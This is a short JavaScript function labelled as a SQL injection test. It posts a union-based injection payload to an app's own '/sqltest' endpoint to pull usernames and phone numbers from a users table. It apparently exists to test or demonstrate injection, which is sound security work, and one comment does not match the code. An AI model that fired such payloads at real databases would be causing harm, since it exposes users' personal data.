/**
 * SQL Injection Test
 *
 * @param {*} csrf
 *
 * @todo: Move to a separate file
 */


/* Sign in and return to previous url on success. */
function injectSQL(csrf) {
    let sqlInjection = new XMLHttpRequest();
    sqlInjection.open('POST', '/sqltest', true);
    sqlInjection.setRequestHeader('Content-Type', 'application/json');
    sqlInjection.setRequestHeader('X-CSRF-TOKEN', csrf);
    sqlInjection.onload = function() {
        console.log("injection result:");
        console.log(sqlInjection.responseText);
    };

    sqlInjection.send(JSON.stringify({
        "query": "u' or 1=1 union select username from users union select cell from users; #"
    }));
}
